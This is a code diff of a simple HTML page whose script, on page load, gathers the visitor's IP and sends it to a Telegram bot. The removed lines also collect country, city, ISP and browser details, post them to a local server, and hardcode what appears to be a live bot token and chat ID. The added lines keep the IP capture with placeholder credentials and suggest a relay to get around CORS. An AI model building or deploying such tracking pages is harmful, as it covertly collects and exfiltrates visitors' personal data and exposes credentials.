@@ -5,73 +5,49 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Page</title>
     <script>
-        // استبدل هذه القيم بمعلومات بوتك الخاص
-        const TELEGRAM_BOT_TOKEN = '7641723616:AAEROe8RdRoaKhAxbVv6lfUvQCURuCMBgbY';
-        const TELEGRAM_CHAT_ID = '7762891775';
-        
-        // دالة لإرسال الرسالة إلى تيليجرام
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
+        // دالة لجلب الـ IP باستخدام ipify (يدعم CORS)
+        async function getIP() {
             try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
+                const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
-                console.log('Message sent to Telegram:', data);
+                return data.ip;
             } catch (error) {
-                console.error('Error sending to Telegram:', error);
+                console.error("Error fetching IP:", error);
+                return null;
             }
         }
 
-        // جمع المعلومات وإرسالها
-        fetch('http://ip-api.com/json')
-            .then(response => response.json())
-            .then(data => {
-                const message = `
-<b>New Visitor Information</b>
-IP: ${data.query}
-Country: ${data.country}
-Region: ${data.regionName}
-City: ${data.city}
-ISP: ${data.isp}
-Device: ${navigator.userAgent}
-                `;
-                
-                // إرسال المعلومات إلى تيليجرام
-                sendToTelegram(message);
-                
-                // يمكنك أيضاً إرسالها إلى السيرفر الخاص بك إذا أردت
-                fetch('http://192.168.137.1:5000/log_ip', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        ip: data.query,
-                        country: data.country,
-                        region: data.regionName,
-                        city: data.city,
-                        isp: data.isp
-                    })
-                });
-            })
-            .catch(error => {
-                console.error('Error fetching IP:', error);
-                sendToTelegram(`Error fetching visitor info: ${error.message}`);
-            });
+        // دالة لإرسال الرسالة إلى تيليجرام (لن تعمل مباشرة على GitHub بسبب CORS)
+        async function sendToTelegram(ip) {
+            const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // ⚠️ استبدله برمز بوتك
+            const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // ⚠️ استبدله بمعرف الدردشة
+            
+            const message = `📢 زائر جديد!\nIP: ${ip}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+            
+            try {
+                // ⚠️ لن يعمل هذا مباشرة على GitHub Pages بسبب CORS
+                // الحل: استخدام Webhook أو خدمة وسيطة
+                await fetch(url);
+                console.log("تم إرسال الـ IP إلى تيليجرام");
+            } catch (error) {
+                console.error("Error sending to Telegram:", error);
+            }
+        }
+
+        // عند تحميل الصفحة، يتم جلب الـ IP وإرساله
+        window.onload = async function() {
+            const ip = await getIP();
+            if (ip) {
+                console.log("تم الحصول على الـ IP:", ip);
+                await sendToTelegram(ip); // ⚠️ سيحتاج إلى حل بديل بسبب CORS
+            }
+        };
     </script>
 </head>
 <body>
-    <!-- محتوى الصفحة -->
+    <!-- يمكنك إضافة محتوى الصفحة هنا -->
+    <h1>مرحباً!</h1>
+    <p>يتم الآن تسجيل عنوان IP الخاص بك.</p>
 </body>
-  </html>
+</html>
